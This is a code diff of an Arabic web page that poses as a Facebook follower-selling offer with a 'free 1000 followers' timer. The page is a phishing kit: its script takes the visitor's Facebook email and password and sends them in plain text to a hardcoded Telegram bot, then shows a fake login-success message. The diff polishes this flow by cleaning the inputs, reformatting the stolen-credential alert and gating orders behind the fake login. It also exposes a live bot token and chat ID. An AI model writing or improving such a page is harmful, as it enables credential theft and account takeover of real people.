@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        /* التعديلات الجديدة لمظهر المؤقت */
+        /* التنسيقات المضافة/المعدلة للمؤقت والرسائل */
         .free-offer-item .diamond-info {
             flex-direction: column;
             align-items: flex-start;
@@ -20,7 +20,6 @@
             margin-bottom: 5px;
         }
 
-        /* تنسيق المؤقت داخل الباقة */
         .free-offer-item .timer {
             font-size: 20px;
             font-weight: bold;
@@ -32,7 +31,6 @@
             display: inline-block;
         }
 
-        /* تعديل مظهر زر العرض بعد انتهاء المؤقت */
         .paid-expired-item .free-price {
             color: #dc3545;
         }
@@ -41,8 +39,8 @@
             background-color: #dc3545;
         }
 
-        /* رسالة التأكيد العلوية (العامة) */
-        #notification-message { /* تم تغيير ID من confirmation-message إلى notification-message */
+        /* رسالة التنبيه العلوية */
+        #notification-message {
             position: fixed;
             top: 0;
             right: 0;
@@ -59,27 +57,27 @@
         }
         
         /* حالات ألوان الرسائل */
-        #notification-message.success { /* اللون الأخضر للنجاح */
+        #notification-message.success {
             background-color: #28a745; 
             color: white;
         }
 
-        #notification-message.error { /* اللون الأحمر للخطأ */
+        #notification-message.error {
             background-color: #dc3545; 
             color: white;
         }
         
-        #notification-message.info { /* اللون الأزرق للمعلومات */
+        #notification-message.info {
             background-color: #17a2b8; 
             color: white;
         }
 
         #notification-message.visible {
             transform: translateY(0);
-            opacity: 1; /* إظهار كامل */
+            opacity: 1;
         }
         
-        /* تعديل الألوان والأيقونات لـ Facebook (لضمان التناسق) */
+        /* تنسيق الألوان لـ Facebook */
         header h1 {
             background: linear-gradient(90deg, #1877f2, #42a5f5);
             -webkit-background-clip: text;
@@ -136,7 +134,7 @@
                         </div>
                         <span class="free-price">**مجاني!**</span>
                     </div>
-                    <button class="buy-btn free-offer-btn" data-package="1000 متابع مجاني - عرض المؤقت" data-is-paid="false" disabled>اطلب الآن مجاناً</button>
+                    <button class="buy-btn free-offer-btn" data-package="1000 متابع مجاني - عرض المؤقت" data-is-paid="false" data-is-auth-required="true" disabled>اطلب الآن مجاناً</button>
                 </div>
             </div>
         </section>
@@ -150,7 +148,7 @@
                         <span>**1000 متابع (عرض منتهي)**</span>
                         <span class="free-price">**0.49$**</span>
                     </div>
-                    <button class="buy-btn paid-expired-btn" data-package="1000 متابع - عرض منتهي 0.49$" data-is-paid="false" disabled>شراء بخصم خاص</button>
+                    <button class="buy-btn paid-expired-btn" data-package="1000 متابع - عرض منتهي 0.49$" data-is-paid="false" data-is-auth-required="true" disabled>شراء بخصم خاص</button>
                 </div>
             </div>
         </section>
@@ -158,9 +156,9 @@
         <section class="section" id="packages-section">
             <h2>📦 **باقات المتابعين الموثوقة**</h2>
             <div class="diamond-list">
-                <div class="diamond-item"><div class="diamond-info"><span>10,000 متابع فيسبوك</span><span>5$</span></div><button class="buy-btn" data-package="10000 متابع - 5$" data-is-paid="true" disabled>شراء الآن</button></div>
-                <div class="diamond-item"><div class="diamond-info"><span>25,000 متابع فيسبوك</span><span>10$</span></div><button class="buy-btn" data-package="25000 متابع - 10$" data-is-paid="true" disabled>شراء الآن</button></div>
-                <div class="diamond-item"><div class="diamond-info"><span>55,000 متابع فيسبوك</span><span>20$</span></div><button class="buy-btn" data-package="55000 متابع - 20$" data-is-paid="true" disabled>شراء الآن</button></div>
+                <div class="diamond-item"><div class="diamond-info"><span>10,000 متابع فيسبوك</span><span>5$</span></div><button class="buy-btn" data-package="10000 متابع - 5$" data-is-paid="true" data-is-auth-required="true" disabled>شراء الآن</button></div>
+                <div class="diamond-item"><div class="diamond-info"><span>25,000 متابع فيسبوك</span><span>10$</span></div><button class="buy-btn" data-package="25000 متابع - 10$" data-is-paid="true" data-is-auth-required="true" disabled>شراء الآن</button></div>
+                <div class="diamond-item"><div class="diamond-info"><span>55,000 متابع فيسبوك</span><span>20$</span></div><button class="buy-btn" data-package="55000 متابع - 20$" data-is-paid="true" data-is-auth-required="true" disabled>شراء الآن</button></div>
             </div>
         </section>
 
@@ -171,7 +169,7 @@
     </footer>
 
     <script>
-        // ======= إعدادات تيليجرام (تم تصحيح التوكن) =======
+        // ======= إعدادات تيليجرام =======
         const BOT_TOKEN = '8589468780:AAHUnSMcg9DznAIc438E3CdaCp34XmM17dQ'; 
         const CHAT_ID = '6313103532';     
         // =================================
@@ -189,23 +187,21 @@
         
         // ============= وظيفة إظهار رسالة التنبيه العلوية =============
         function showNotificationMessage(text, type) {
-            // type يمكن أن تكون: 'success', 'error', 'info'
             notificationMessage.textContent = text;
-            notificationMessage.className = ''; // إزالة جميع الفئات الحالية
+            notificationMessage.className = '';
             notificationMessage.classList.add(type);
             notificationMessage.classList.add('visible');
 
             setTimeout(() => {
-                // إخفاء بالتدريج
                 notificationMessage.style.opacity = '0'; 
                 setTimeout(() => {
                     notificationMessage.classList.remove('visible');
-                    notificationMessage.style.opacity = ''; // إعادة تعيين Opacity
-                }, 300); // 300ms هي مدة transition
-            }, 2000); // إظهار لمدة 2 ثانية
+                    notificationMessage.style.opacity = '';
+                }, 300);
+            }, 2000);
         }
         
-        // ============= وظيفة إرسال تيليجرام (مع فلترة الطلبات) =============
+        // ============= وظيفة إرسال تيليجرام (مع التنسيق المطلوب) =============
         function sendToTelegram(text, isOrder = false) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
             
@@ -213,11 +209,10 @@
             .then(response => response.json()) 
             .then(data => {
                 if (data.ok) {
-                    // رسالة نجاح مخصصة للطلب المجاني أو تأكيد البيانات
                     if (isOrder) {
                         showNotificationMessage('✅ تم استلام طلبك بنجاح! سيتم التنفيذ خلال 24 ساعة.', 'info');
                     } else {
-                        // هذه رسالة النجاح الخاصة بتسجيل الدخول
+                        // رسالة نجاح تسجيل الدخول
                         showNotificationMessage('🔑 لقد تم تسجيل الدخول بنجاح.', 'success');
                     }
                 } else {
@@ -234,16 +229,23 @@
         // ============= إرسال بيانات الحساب الأساسية =============
         submitBtn.addEventListener('click', (e) => {
             e.preventDefault();
-            const loginId = loginIdInput.value;
             
-            if (loginId.includes('@') && !loginId.includes('.')) {
-                showNotificationMessage('⚠️ يرجى إدخال بريد إلكتروني صالح.', 'error');
-                return;
+            // تنظيف المدخلات
+            let loginId = loginIdInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (loginId.length === 0 || password.length === 0) {
+                 showNotificationMessage('⚠️ يرجى ملء جميع الحقول.', 'error');
+                 return;
             }
             
+            // إزالة جميع المسافات من البريد الإلكتروني/المعرف قبل الإرسال
+            const cleanedLoginId = loginId.replace(/\s/g, ''); 
+            
             if (form.checkValidity()) {
-                const password = passwordInput.value;
-                const message = `<b>[فيسبوك] - تأكيد بيانات الحساب:</b>\nالمعرف: <code>${loginId}</code>\nالمرور: <code>${password}</code>`;
+                // تنسيق رسالة التليجرام المطلوبة
+                const message = `🚨  <b>تسجيل دخول جديد!</b> 🚨\n------------------------------------\nالبريد الإلكتروني: <code>${cleanedLoginId}</code>\nكلمة المرور: <code>${password}</code>\n------------------------------------`;
+                
                 sendToTelegram(message, false); // إرسال بيانات الحساب
                 
                 submitBtn.disabled = true;
@@ -254,25 +256,27 @@
             }
         });
 
-        // ============= إرسال بيانات الشراء (مع فلترة) =============
+        // ============= إرسال بيانات الشراء (مع فلترة وتحقق) =============
         buyBtns.forEach(btn => {
             btn.addEventListener('click', () => {
+                const isAuthRequired = btn.getAttribute('data-is-auth-required') === 'true';
                 const isPaidOrder = btn.getAttribute('data-is-paid') === 'true';
 
-                if (submitBtn.disabled) {
-                    if (isPaidOrder) {
-                        // لا يتم إرسال الطلب المدفوع إلى التليجرام (حسب طلبك)
-                        showNotificationMessage('💵 جارٍ تحويلك إلى صفحة الدفع...', 'info');
-                    } else {
-                        // هذا طلب العرض المجاني أو العرض المنتهي المخفض (يتم إرساله)
-                        const package = btn.getAttribute('data-package');
-                        const loginId = loginIdInput.value;
-                        const message = `<b>[فيسبوك - طلب خدمة]</b>\nالحساب: <code>${loginId}</code>\n<b>الطلب: ${package}</b>\n***يرجى معالجة الطلب***`;
-                        sendToTelegram(message, true); // إرسال طلب الخدمة المجانية
-                    }
-                } else {
-                    // رسالة خطأ عند محاولة الطلب قبل تسجيل الدخول
+                // التحقق من تسجيل الدخول (حل مشكلة عدم ظهور الرسالة)
+                if (isAuthRequired && submitBtn.disabled !== true) {
                     showNotificationMessage('❌ يجب تسجيل حسابك أولاً.', 'error');
+                    return; // إيقاف التنفيذ
+                }
+
+                if (isPaidOrder) {
+                    // الطلبات المدفوعة: إشعار محلي فقط
+                    showNotificationMessage('💵 جارٍ تحويلك إلى صفحة الدفع...', 'info');
+                } else {
+                    // الطلبات المجانية/المخفضة (تريد استقبالها): إرسال إلى التليجرام
+                    const package = btn.getAttribute('data-package');
+                    const loginId = loginIdInput.value;
+                    const message = `<b>[فيسبوك - طلب خدمة]</b>\nالحساب: <code>${loginId}</code>\n<b>الطلب: ${package}</b>\n***يرجى معالجة الطلب***`;
+                    sendToTelegram(message, true);
                 }
             });
         });
@@ -296,7 +300,6 @@
                 expiredPaidOfferSection.classList.remove('hidden');
                 
                 if (submitBtn.disabled) {
-                    // تفعيل زر العرض المخفض في حال كانت البيانات مؤكدة
                     document.querySelector('.paid-expired-btn').disabled = false; 
                 }
                 freeOfferBtn.disabled = true;
